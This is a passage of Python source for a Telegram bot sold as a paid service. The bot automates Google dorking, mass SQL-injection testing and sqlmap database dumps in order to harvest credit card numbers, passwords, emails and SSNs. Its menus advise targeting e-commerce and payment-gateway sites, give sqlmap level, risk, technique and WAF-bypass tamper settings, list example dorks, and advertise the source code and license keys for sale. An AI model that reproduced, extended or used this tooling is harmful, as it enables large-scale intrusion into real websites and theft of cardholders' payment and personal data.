                [InlineKeyboardButton("◀ Bᴀᴄᴋ Tᴏ Gᴜɪᴅᴇ", callback_data="menu_guide")],
                [InlineKeyboardButton("⏪ Mᴀɪɴ Mᴇɴᴜ",   callback_data="menu_back")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "guide_dump":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "📗︎ 𝘿𝙪𝙢𝙥𝙞𝙣𝙜 𝘼 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🔶 *Mᴇᴛʜᴏᴅ A — Dᴏʀᴋs ➪ DB Dᴜᴍᴘ (Aᴜᴛᴏᴍᴀᴛᴇᴅ Pɪᴘᴇʟɪɴᴇ)*\n"
            "  1. Usᴇ `Dᴏʀᴋs ➪ DB Dᴜᴍᴘ`\n"
            "  2. Cᴏɴғɪɢᴜʀᴇ Sǫʟ-Mᴀᴘ Sᴇᴛᴛɪɴɢs\n"
            "  3. Sᴇɴᴅ Yᴏᴜʀ Dᴏʀᴋs (1 Pᴇʀ Lɪɴᴇ)\n"
            "  4. Bᴏᴛ Wɪʟʟ: Sᴇᴀʀᴄʜ ➪ Fɪɴᴅ URLs ➪ Tᴇsᴛ SQLi ➪ Dᴜᴍᴘ DB\n"
            "  5. Eᴠᴇʀʏ Sᴜᴄᴄᴇssғᴜʟ Dᴜᴍᴘ = ZIP Cᴏᴍᴇs Tᴏ Yᴏᴜ Iɴsᴛᴀɴᴛʟʏ\n\n"
            "🔷 *Mᴇᴛʜᴏᴅ B — URLs ➪ DB Dᴜᴍᴘ (Pʀᴏᴠɪᴅᴇ Uʀʟs Hᴇʀᴇ)*\n"
            "  1. Gᴇᴛ Iɴᴊᴇᴄᴛᴀʙʟᴇ URLs Fʀᴏᴍ `Dᴇᴇᴘ Pᴀʀsᴇʀ`\n"
            "  2. Usᴇ `URLs ➪ DB Dᴜᴍᴘ`\n"
            "  3. Sᴇɴᴅ URLs (1 Pᴇʀ Lɪɴᴇ)\n"
            "  4. Bᴏᴛ Rᴜɴs Sǫʟᴍᴀᴘ Oɴ Eᴀᴄʜ URL Dɪʀᴇᴄᴛʟʏ\n\n"
            "❓ *Wʜᴀᴛ Gᴇᴛs Dᴜᴍᴘᴇᴅ:*\n"
            "  • All Dᴀᴛᴀʙᴀsᴇ Tᴀʙʟᴇs\n"
            "  • Cᴏʟᴜᴍɴs: Eᴍᴀɪʟs, Pᴀssᴡᴏʀᴅs, Usᴇʀɴᴀᴍᴇs, CC's Dᴀᴛᴀ\n"
            "  • DBMS Fɪɴɢᴇʀᴘʀɪɴᴛ (MySQL/PostgreSQL/etc)\n"
            "  • Cᴜʀʀᴇɴᴛ: DB + Cᴜʀʀᴇɴᴛ: Usᴇʀ Iɴғᴏ\n\n"
            "📒 *ZIP Fɪʟᴇ Cᴏɴᴛᴀɪɴs:*\n"
            "  • CSV Fɪʟᴇs Fᴏʀ Eᴀᴄʜ Tᴀʙʟᴇ Dᴜᴍᴘᴇᴅ\n"
            "  • Rᴀᴡ Sǫʟᴍᴀᴘ Oᴜᴛᴘᴜᴛ Lᴏɢs\n"
            "  • Aʟʟ Dᴀᴛᴀ ɪɴ Rᴇᴀᴅᴀʙʟᴇ Fᴏʀᴍᴀᴛ\n\n"
            "💡 *Rᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ Sᴇᴛᴛɪɴɢs Fᴏʀ CC Sɪᴛᴇs:*\n"
            "  • Lᴇᴠᴇʟ: `3`, Rɪsᴋ: `2`\n"
            "  • Tᴇᴄʜɴɪǫᴜᴇ: `BEUSTQ` (Aʟʟ Mᴇᴛʜᴏᴅs)\n"
            "  • Tᴀᴍᴘᴇʀ: `space2comment,between,charencode`\n"
            "  • Tʜʀᴇᴀᴅs: `10`",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀ Bᴀᴄᴋ Tᴏ Gᴜɪᴅᴇ", callback_data="menu_guide")],
                [InlineKeyboardButton("⏪ Mᴀɪɴ Mᴇɴᴜ",   callback_data="menu_back")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "guide_cc":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "📘︎ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙊𝙛 𝘾𝘾 𝙀𝙭𝙩𝙧𝙖𝙘𝙩𝙞𝙤𝙣\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "📤 *Oᴜᴛᴘᴜᴛ Fᴏʀᴍᴀᴛ:*\n"
            "  `4532015112830366|12|27|456`\n\n"
            "❓ *Hᴏᴡ Bᴏᴛ Lᴏᴏᴋ's Fᴏʀ CC Dᴀᴛᴀ?*\n"
            "  1. Sǫʟ-Mᴀᴘ API Rᴇsᴘᴏɴsᴇs `/scan/{id}/data` — Lɪᴠᴇ Dᴀᴛᴀ Dᴜᴍᴘ\n"
            "  2. CSV Fɪʟᴇs Iɴ Sǫʟ-Mᴀᴘ Oᴜᴛᴘᴜᴛ Fᴏʟᴅᴇʀ — Aʟʟ Dᴜᴍᴘᴇᴅ Tᴀʙʟᴇs\n"
            "  3. Fᴜʟʟ Lᴏɢ Lɪɴᴇs — Sᴏᴍᴇ Cᴀsᴇs Dᴀᴛᴀ Aᴘᴘᴇᴀʀs Iɴ Lᴏɢs\n\n"
            "❓ *Wʜᴀᴛ Tʏᴘᴇs Oғ Cᴀʀᴅs Aʀᴇ Dᴇᴛᴇᴄᴛᴇᴅ?*\n"
            "  • ✯ Vɪsᴀ (Sᴛᴀʀᴛs Wɪᴛʜ 4, 13-16 Dɪɢɪᴛs)\n"
            "  • ✯ Mᴀsᴛᴇʀᴄᴀʀᴅ (Sᴛᴀʀᴛs Wɪᴛʜ 51-55 ᴏʀ 2221-2720)\n"
            "  • ✯ Aᴍᴇx (Sᴛᴀʀᴛs Wɪᴛʜ 34 ᴏʀ 37, 15 Dɪɢɪᴛs)\n"
            "  • ✯ Dɪsᴄᴏᴠᴇʀ (Sᴛᴀʀᴛs Wɪᴛʜ 6011 ᴏʀ 65)\n"
            "  • ✯ JCB (Sᴛᴀʀᴛs Wɪᴛʜ 2131, 1800, ᴏʀ 3528-3589)\n\n"
            "  = `card_number|exp_month|exp_year|cvv`\n\n"
            "❓ *Wʜᴀᴛ Iғ CVV/Exᴘɪʀʏ Is Nᴏᴛ Iɴ DB?*\n"
            "  ➪ Tʜᴇʏ'ʀᴇ Mᴀʀᴋᴇᴅ As `??` or `???`\n"
            "  ➪ Cᴀʀᴅ Nᴜᴍʙᴇʀ Is Sᴛɪʟʟ Vᴀʟɪᴅ Aɴᴅ Usᴀʙʟᴇ..!\n\n"
            "🔦 *Sᴇᴠᴇʀɪᴛʏ Lᴇᴠᴇʟs (Dᴏᴄᴛᴏʀ SQL Sʏsᴛᴇᴍ):*\n"
            "  🔴 *Cʀɪᴛɪᴄᴀʟ* — CC + CVV/Exᴘɪʀʏ Cᴏʟᴜᴍɴs Fᴏᴜɴᴅ\n"
            "  🟠 *Hɪɢʜ*     — Eᴍᴀɪʟ + Pᴀssᴡᴏʀᴅ ᴏʀ SSN Fᴏᴜɴᴅ\n"
            "  🟡 *Mᴇᴅɪᴜᴍ*   — Eᴍᴀɪʟ ᴏʀ Usᴇʀɴᴀᴍᴇ Oɴʟʏ\n"
            "  🟢 *Lᴏᴡ*      — Pʜᴏɴᴇ/Aᴅᴅʀᴇss Oɴʟʏ\n"
            "  ⚪ *Bʟᴀɴᴋ*     — Nᴏ Sᴇɴsɪᴛɪᴠᴇ Dᴀᴛᴀ\n\n"
            "💡 *Bᴇsᴛ Sɪᴛᴇs Tᴏ Tᴀʀɢᴇᴛ {CC}*\n"
            "  ➪ E-ᴄᴏᴍᴍᴇʀᴄᴇ Sɪᴛᴇs Wɪᴛʜ `?product_id=`, `?item=`, `?cat=`\n"
            "  ➪ Sɪᴛᴇs Wɪᴛʜ Sᴛʀɪᴘᴇ/Pᴀʏᴘᴀʟ Gᴀᴛᴇᴡᴀʏs\n"
            "  ➪ Usᴇ `HQ SQLi Dᴏʀᴋs` — Pᴀʏᴍᴇɴᴛ-Tᴀʀɢᴇᴛᴇᴅ Pᴀᴛᴛᴇʀɴs",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀ Bᴀᴄᴋ Tᴏ Gᴜɪᴅᴇ", callback_data="menu_guide")],
                [InlineKeyboardButton("⏪ Mᴀɪɴ Mᴇɴᴜ",   callback_data="menu_back")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "guide_sqlopts":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "📙 𝙎𝙦𝙡-𝙈𝙖𝙥 𝙎𝙚𝙩𝙩𝙞𝙣𝙜𝙨 𝙀𝙭𝙥𝙡𝙖𝙞𝙣𝙚𝙙\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "📶 *Lᴇᴠᴇʟ (1–5)*\n"
            " • Cᴏɴᴛʀᴏʟs Hᴏᴡ Mᴀɴʏ Tᴇsᴛs Sǫʟ-Mᴀᴘ Rᴜɴs Pᴇʀ Pᴀʀᴀᴍᴇᴛᴇʀ\n"
            "  `1` = Fᴀsᴛ, Fᴇᴡᴇʀ Tᴇsᴛs | `5` = Sʟᴏᴡ, Mᴀxɪᴍᴜᴍ Cᴏᴠᴇʀᴀɢᴇ\n"
            "  ➪ Rᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ Fᴏʀ CC Hᴜɴᴛɪɴɢ: `3`\n\n"
            "📛 *Rɪsᴋ (1–3)*\n"
            " • Cᴏɴᴛʀᴏʟs Hᴏᴡ Aɢɢʀᴇssɪᴠᴇ Tʜᴇ Iɴᴊᴇᴄᴛɪᴏɴs Aʀᴇ\n"
            " • `1` = Sᴀғᴇ (Nᴏ Uᴘᴅᴀᴛᴇ/Dᴇʟᴇᴛᴇ) | `3` = Hᴇᴀᴠʏ (Mᴀʏ Cᴀᴜsᴇ Eʀʀᴏʀs)\n"
            "  ➪ Rᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ: `2` (Bᴀʟᴀɴᴄᴇᴅ)\n\n"
            "🔰 *Tᴇᴄʜɴɪǫᴜᴇ*\n"
            " • Wʜɪᴄʜ SQLi Mᴇᴛʜᴏᴅ Tᴏ Usᴇ?\n"
            "  `B` = Bᴏᴏʟᴇᴀɴ-Bᴀsᴇᴅ | `E` = Eʀʀᴏʀ-Bᴀsᴇᴅ\n"
            "  `U` = Uɴɪᴏɴ-Bᴀsᴇᴅ   | `S` = Sᴛᴀᴄᴋᴇᴅ Qᴜᴇʀɪᴇs\n"
            "  `T` = Tɪᴍᴇ-Bᴀsᴇᴅ    | `Q` = Iɴʟɪɴᴇ Qᴜᴇʀɪᴇs\n"
            "  ➪ Usᴇ `BEUSTQ` Eᴠᴇʀʏᴛʜɪɴɢ — Bᴇsᴛ Hɪᴛ Rᴀᴛᴇ\n\n"
            "💠 *Tᴀᴍᴘᴇʀ Sᴄʀɪᴘᴛs*\n"
            " • Bʏᴘᴀss WAF Pʀᴏᴛᴇᴄᴛɪᴏɴ\n"
            "  `Sᴛᴀɴᴅᴀʀᴅ` = Bᴀsɪᴄ Bʏᴘᴀss Fᴏʀ Mᴏsᴛ Sɪᴛᴇs\n"
            "  `Mᴀx`  = Hᴇᴀᴠʏ Bʏᴘᴀss Fᴏʀ Cʟᴏᴜᴅғᴀʀᴇ/MᴏᴅSᴇᴄᴜʀɪᴛʏ\n"
            "  ➪ Usᴇ `Max` Iғ Sɪᴛᴇs Bʟᴏᴄᴋ Nᴏʀᴍᴀʟ Rᴇǫᴜᴇsᴛs\n\n"
            "🧶 *Tʜʀᴇᴀᴅs (5/10/20)*\n"
            " • Pᴀʀᴀʟʟᴇʟ Cᴏɴɴᴇᴄᴛɪᴏɴs — Fᴀsᴛᴇʀ = Mᴏʀᴇ Rᴇsᴏᴜʀᴄᴇ Usᴇᴅ\n"
            "  ➪ `10` Tʜʀᴇᴀᴅs Is Bᴇsᴛ\n\n"
            "👜 *Bᴜʟᴋ Mᴏᴅᴇ (ON/OFF)*\n"
            " • ON = Sᴇɴᴅs ALL URLs Iɴ Oɴᴇ Sǫʟ-Mᴀᴘ Tᴀsᴋ (Fᴀsᴛᴇʀ Bᴜᴛ Lᴇss Cᴏɴᴛʀᴏʟʟᴇᴅ)\n"
            " • OFF = Oɴᴇ Sǫʟ-Mᴀᴘ Tᴀsᴋ Pᴇʀ URL (Mᴏʀᴇ Dᴇᴛᴀɪʟᴇᴅ, Pᴇʀ-Sɪᴛᴇ Rᴇsᴜʟᴛs)\n"
            "  ➪ OFF Rᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ Fᴏʀ Tᴀʀɢᴇᴛᴛɪɴɢ CC's\n\n"
            "🚂 *Eɴɢɪɴᴇ*\n"
            " • `Rᴇsᴛ API` = Usᴇs Sǫʟ-Mᴀᴘ API Sᴇʀᴠᴇʀ (Bᴇsᴛ, Sᴜᴘᴘᴏʀᴛs Cᴀɴᴄᴇʟ)\n"
            " • `Sᴜʙᴘʀᴏᴄᴇss` = Dɪʀᴇᴄᴛ Cᴍᴅ Lɪɴᴇ (Fᴀʟʟʙᴀᴄᴋ)\n"
            "  ➪ Aʟᴡᴀʏs Usᴇ `Rᴇsᴛ API`",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀ Bᴀᴄᴋ Tᴏ Gᴜɪᴅᴇ", callback_data="menu_guide")],
                [InlineKeyboardButton("⏪ Mᴀɪɴ Mᴇɴᴜ",   callback_data="menu_back")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "menu_help":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "🆘 𝙃𝙚𝙡𝙥 & 𝙎𝙪𝙥𝙥𝙤𝙧𝙩\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Fᴏʀ Sᴜᴘᴘᴏʀᴛ & Bᴜɢ Rᴇᴘᴏʀᴛɪɴɢ Cᴏɴᴛᴀᴄᴛ:\n"
            f"🧛🏻  {ADMIN_USERNAME}\n\n"
            "📖 Nᴇᴇᴅ Iɴsᴛʀᴜᴄᴛɪᴏɴs?\n"
            "  ➪ Tᴀᴘ `🚸︎ Hᴏᴡ Tᴏ ᴜsᴇ` Oɴ Tʜᴇ Mᴀɪɴ Mᴇɴᴜ\n"
            "  ➪ Sᴛᴇᴘ-Bʏ-Sᴛᴇᴘ Gᴜɪᴅᴇ Fᴏʀ Aʟʟ Pᴏᴡᴇʀs\n",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # ── Buy Source Code ───────────────────────────────────────────────────────
    elif data == "menu_source":
        src_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🧛🏻 Oᴡɴᴇʀ Hᴇʀᴇ", url=f"https://t.me/{ADMIN_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton("◀ Bᴀᴄᴋ", callback_data="menu_back")],
        ])
        await query.edit_message_text(
           "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
           "🧤 𝙎𝙥𝙞𝙙𝙚𝙮 - 𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗢𝗗𝗘\n"
           "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            "💡 *Iᴍᴀɢɪɴᴇ Hᴀᴠɪɴɢ A Aᴜᴛᴏᴍᴀᴛᴇᴅ Dᴜᴍᴘᴇʀ..!.*\n"
            "⛲ Iᴛ's Wᴏʀᴋғʟᴏᴡ Gᴏᴇs Lɪᴋᴇ — Kᴇʏᴡᴏʀᴅ » Dᴏʀᴋs » Tᴀʀɢᴇᴛɪɴɢ Wᴇʙs » Sᴄᴀɴɴɪɴɢ » Exᴛʀᴀᴄᴛɪɴɢ Dᴀᴛᴀʙᴀsᴇs Tᴏ .ᴢɪᴘ.\n"
            "🚄 *Fᴜʟʟʏ Aᴜᴛᴏᴍᴀᴛᴇᴅ. Nᴏ Mᴀɴᴜᴀʟ Wᴏʀᴋ.*\n\n"
           "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
           "❓︎ 𝙒𝙝𝙖𝙩 𝙔𝙤𝙪 𝙂𝙚𝙩 𝙒𝙞𝙩𝙝 𝙏𝙝𝙚 𝙎𝙤𝙪𝙧𝙘𝙚 𝘾𝙤𝙙𝙚:\n"
           "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🚂 *Sᴍᴀʀᴛ Generation Eɴɢɪɴᴇ*\n"
            "  ➪ Gᴇɴᴇʀᴀᴛᴇ Uᴘ Tᴏ *1,000,000* Kᴇʏᴡᴏʀᴅs & Dᴏʀᴋs\n"
            "  ➪ HQ, CMS, Cᴏᴜɴᴛʀʏ, Exᴘᴏsᴇᴅ Fɪʟᴇ Dᴏʀᴋ Mᴏᴅᴇs\n"
            "  ➪ Tᴀʀɢᴇᴛs Rᴇᴀʟ Vᴜʟɴᴇʀᴀʙʟᴇ Sɪᴛᴇs Aᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n\n"
            "☯️ *Dᴜᴀʟ-Eɴɢɪɴᴇ URL Pᴀʀsᴇʀ*\n"
            "  ➪ Sᴄʀᴀᴘᴇs Gᴏᴏɢʟᴇ (DDGS) + Bɪɴɢ Sɪᴍᴜʟᴛᴀɴᴇᴏᴜsʟʏ\n"
            "  ➪ Pᴜʟʟs Tʜᴏᴜsᴀɴᴅs Oғ Rᴇᴀʟ URLs Iɴ Sᴇᴄᴏɴᴅs\n"
            "  ➪ Fɪʟᴛᴇʀs Dᴜᴘʟɪᴄᴀᴛᴇs, Cʟᴇᴀɴ Rᴇsᴜʟᴛs Iɴsᴛᴀɴᴛʟʏ\n\n"
            "📠 *Mᴀss SQLi Sᴄᴀɴɴᴇʀ*\n"
            "  ➪ Tᴇsᴛs *Hᴜɴᴅʀᴇᴅs* Oғ URLs Aᴛ Oɴᴄᴇ\n"
            "  ➪ Eʀʀᴏʀ-Bᴀsᴇᴅ + Uɴɪᴏɴ-Bᴀsᴇᴅ Dᴇᴛᴇᴄᴛɪᴏɴ\n"
            "  ➪ Rᴜɴs Aᴛ Fᴜʟʟ Sᴘᴇᴇᴅ Wɪᴛʜ Asʏɴᴄ Wᴏʀᴋᴇʀs\n\n"
            "🚜 *Aᴜᴛᴏ Dᴀᴛᴀʙᴀsᴇ Dᴜᴍᴘᴇʀ*\n"
            "  ➪ Pᴏᴡᴇʀᴇᴅ Bʏ Sǫʟ-Mᴀᴘ Rᴇsᴛ API\n"
            "  ➪ Dᴜᴍᴘ Tᴀʙʟᴇs, Cᴏʟᴜᴍɴs, Rᴏᴡs Aᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n"
            "  ➪ Exᴛʀᴀᴄᴛs Eᴍᴀɪʟs, Pᴀssᴡᴏʀᴅs, CC Dᴀᴛᴀ\n"
            "  ➪ Sᴇɴᴅs Rᴇsᴜʟᴛs *Dɪʀᴇᴄᴛʟʏ Iɴ Cʜᴀᴛ*\n\n"
            "🥷🏻 *Pʀᴏxʏ Sʏsᴛᴇᴍ*\n"
            "  ➪ Rᴏᴛᴀᴛᴇ Uɴʟɪᴍɪᴛᴇᴅ Pʀᴏxɪᴇs Gʟᴏʙᴀʟʟʏ\n"
            "  ➪ SOCKS4, SOCKS5, HTTP Sᴜᴘᴘᴏʀᴛᴇᴅ\n"
            "  ➪ Kᴇᴇᴘs Yᴏᴜ Aɴᴏɴʏᴍᴏᴜs Eᴠᴇʀʏ Sᴇᴄᴏɴᴅ\n\n"
            "🪪 *Bᴜɪʟᴛ-Iɴ Lɪᴄᴇɴsᴇ & Sᴇʟʟɪɴɢ Sʏsᴛᴇᴍ*\n"
            "  ➪ Sᴇʟʟ Aᴄᴄᴇss Tᴏ Usᴇʀs Wɪᴛʜ Lɪᴄᴇɴsᴇ Kᴇʏs\n"
            "  ➪ Pʟᴀɴs: 30ᴍɪɴ / 1ʜ / 6ʜ / 1ᴅ / 3ᴅ Uᴘ Tᴏ 30ᴅ\n"
            "  ➪ 5-ᴍɪɴ Fʀᴇᴇ Tʀɪᴀʟ Aᴜᴛᴏ-Cᴏɴᴠᴇʀᴛs Usᴇʀs Tᴏ Bᴜʏᴇʀs\n"
            "  ➪ Aᴅᴍɪɴ Pᴀɴᴇʟ Tᴏ Mᴀɴᴀɢᴇ Eᴠᴇʀʏᴛʜɪɴɢ\n\n"
            "🪷 *Fᴜʟʟ Aᴅᴍɪɴ Cᴏɴᴛʀᴏʟ Pᴀɴᴇʟ*\n"
            "  ➪ Gᴇɴᴇʀᴀᴛᴇ & Rᴇᴠᴏᴋᴇ Kᴇʏs\n"
            "  ➪ Bᴀɴ / Uɴʙᴀɴ Usᴇʀs\n"
            "  ➪ Bʀᴏᴀᴅᴄᴀsᴛ\n"
            "  ➪ Lɪᴠᴇ Sᴇʀᴠᴇʀ Sᴛᴀᴛs\n"
            "  ➪ Exᴘᴏʀᴛ Usᴇʀ Lɪsᴛ\n\n"
           "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
           "🍷 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙄𝙣𝙘𝙡𝙪𝙙𝙚𝙨\n"
           "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "  ✅  Fᴜʟʟ Cʟᴇᴀɴ Sᴏᴜʀᴄᴇ Cᴏᴅᴇ\n"
            "  📒  Sᴛᴇᴘ-Bʏ-Sᴛᴇᴘ Sᴇᴛᴜᴘ Gᴜɪᴅᴇ\n"
            "  🆘  Dɪʀᴇᴄᴛ Sᴜᴘᴘᴏʀᴛ Fʀᴏᴍ Oᴡɴᴇʀ\n"
            "  ⚡  Rᴇᴀᴅʏ Tᴏ Dᴇᴘʟᴏʏ Iɴ Mɪɴᴜᴛᴇs\n\n"
           "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🧛🏻 *Cᴏɴᴛᴀᴄᴛ Oᴡɴᴇʀ:* `{ADMIN_USERNAME}`\n"
            f"🎫 *Cᴏᴜᴘᴏɴ Cᴏᴅᴇ:* `{COUPON_CODE}` _(Dɪsᴄᴏᴜɴᴛ Fᴏʀ Sᴇʀɪᴏᴜs Bᴜʏᴇʀs)_\n\n"
            "⬇️ _Tᴀᴘ Bᴇʟᴏᴡ — Oᴡɴᴇʀ Rᴇᴘʟɪᴇs Fᴀsᴛ Lɪᴋᴇ Mᴇ_ ⬇️",
            reply_markup=src_kb,
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # ── sqlmap Settings menu ──────────────────────────────────────────────────
    elif data == "dump_sqlopts":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        await query.edit_message_text(
            _sqlopts_text(user_id),
            reply_markup=make_sqlopts_menu(user_id),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DUMP_WAIT_DORKS

    elif data.startswith("sqlo_"):
        o = _get_sqlopts(user_id)
        if data == "sqlo_lvl_up":
            o["level"] = min(5, o["level"] + 1)
        elif data == "sqlo_lvl_dn":
            o["level"] = max(1, o["level"] - 1)
        elif data == "sqlo_risk_up":
            o["risk"] = min(3, o["risk"] + 1)
        elif data == "sqlo_risk_dn":
            o["risk"] = max(1, o["risk"] - 1)
        elif data == "sqlo_tech_b":
            o["technique"] = "BEUSTQ"
        elif data == "sqlo_tech_eu":
            o["technique"] = "EU"
        elif data == "sqlo_tamp_std":
            o["tamper"] = DEFAULT_TAMPER
        elif data == "sqlo_tamp_max":
            o["tamper"] = (
                "space2comment,between,charencode,randomcomments,"
                "greatest,ifnull2ifisnull,modsecurityzeroversioned,"
                "percentage,randomcase,symboliclogical,unmagicquotes"
            )
        elif data == "sqlo_thr":
            o["threads"] = 5 if o["threads"] == 10 else (20 if o["threads"] == 5 else 10)
        elif data == "sqlo_crawl":
            o["crawl"] = (o["crawl"] + 1) % 4
        elif data == "sqlo_engine":
            o["engine"] = "subprocess" if o["engine"] == "api" else "api"
        elif data == "sqlo_bulk":
            o["bulk"] = not o["bulk"]
        elif data == "sqlo_reset":
            user_sqlopts[user_id] = dict(_DEFAULT_SQLOPTS)
            o = user_sqlopts[user_id]
        elif data == "sqlo_back":
            dump_o = _get_sqlopts(user_id)
            await query.edit_message_text(
                "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
                "🏵️︎ 𝘿𝙊𝙍𝙆𝙎  ➪ 𝘿𝘽 𝘿𝙐𝙈𝙋\n"
                "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
                "🎢 *Fᴜʟʟ Aᴜᴛᴏᴍᴀᴛᴇᴅ Pɪᴘᴇʟɪɴᴇ:*\n"
                "  `1`  Pᴀʀsᴇ Dᴏʀᴋs ➪ Hᴀʀᴠᴇsᴛ URLs\n"
                "  `2`  Tᴇsᴛ URLs Fᴏʀ SQLi\n"
                "  `3`  Sǫʟᴍᴀᴘ Dᴜᴍᴘs Dᴀᴛᴀʙᴀsᴇs\n"
                "  `4`  CC Exᴛʀᴀᴄᴛɪᴏɴ + Dᴇʟɪᴠᴇʀʏ\n\n"
                ",📤 *Sᴇɴᴅ Dᴏʀᴋs As:*\n"
                "  › `.txt` Fɪʟᴇ  _(Oɴᴇ Pᴇʀ Lɪɴᴇ)_\n"
                "  › Sᴇɴᴅ Dɪʀᴇᴄᴛʟʏ Iɴ Cʜᴀᴛ\n\n"
                f"🚂 Eɴɢɪɴᴇ: *{'REST API' if dump_o['engine']=='api' else 'Subprocess'}*  "
                f"│  L{dump_o['level']}R{dump_o['risk']}  │  {dump_o['technique']}\n\n"
                "✿︎━━━━━━━━━━━━━━━━━━━━✿\n︎\n"
                "_Oʀ Usᴇ V2: Sᴇɴᴅ Dᴏʀᴋ Dɪʀᴇᴄᴛʟʏ Tᴏ Sǫʟ-Mᴀᴘ ↓_",
                reply_markup=make_dump_start_menu(),
                parse_mode=ParseMode.MARKDOWN,
            )
            return DUMP_WAIT_DORKS
        try:
            await query.edit_message_text(
                _sqlopts_text(user_id),
                reply_markup=make_sqlopts_menu(user_id),
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass
        return DUMP_WAIT_DORKS

    # ── Google Dork ➪ sqlmap Direct (GOD MODE) ────────────────────────────────
    elif data == "dump_gdork_mode":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        o = _get_sqlopts(user_id)
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "🗺️︎ 𝘿𝙊𝙍𝙆𝙎  ➪ 𝙎𝙦𝙡-𝙈𝙖𝙥 \n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🧤 *Dᴏʀᴋ ➪ Sǫʟ-Mᴀᴘ Dɪʀᴇᴄᴛ Pɪᴘᴇʟɪɴᴇ*\n\n"
            "📤 Sᴇɴᴅ Yᴏᴜʀ Dᴏʀᴋs Aɴᴅ Sǫʟ-Mᴀᴘ Wɪʟʟ Pʀᴏᴄᴇss:\n"
            "  `1`  Qᴜᴇʀʏ Gᴏᴏɢʟᴇ Fᴏʀ Tʜᴇ Dᴏʀᴋs\n"
            "  `2`  Tᴇsᴛ Eᴠᴇʀʏ Rᴇsᴜʟᴛ Fᴏʀ SQLi\n"
            "  `3`  Dᴜᴍᴘ Vᴜʟɴᴇʀᴀʙʟᴇ Dᴀᴛᴀʙᴀsᴇs\n"
            "  `4`  Exᴛʀᴀᴄᴛ CC Dᴀᴛᴀ Aᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ\n\n"
            "⛔ *Exᴀᴍᴘʟᴇ Dᴏʀᴋs:*\n"
            "  › `inurl:index.php?id=`\n"
            "  › `inurl:view.php?cat= site:.br`\n"
            "  › `inurl:product.php?pid= site:.in`\n\n"
            f"💠 L{o['level']}R{o['risk']} │ `{o['technique']}` │ `{o['tamper'][:30]}`\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "_Sᴇɴᴅ Yᴏᴜʀ Dᴏʀᴋs Nᴏᴡ:_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return GDORK_DUMP_WAIT

    return MENU


# ── KEYWORD FLOW ───────────────────────────────────────────────────────────────

async def kw_get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    text = update.message.text.strip()
    try:
        count = int(text.replace(",", "").replace(".", ""))
        if count < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Eɴᴛᴇʀ A Vᴀʟɪᴅ Nᴜᴍʙᴇʀ. E.g. `5000`", parse_mode=ParseMode.MARKDOWN)
        return KW_WAIT_COUNT
    count = min(count, 1_000_000)
    context.user_data["kw_count"] = count
    await update.message.reply_text(
        "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"✅ 𝘾𝙤𝙪𝙣𝙩 𝙎𝙚𝙩: `{count:,}`.\n"
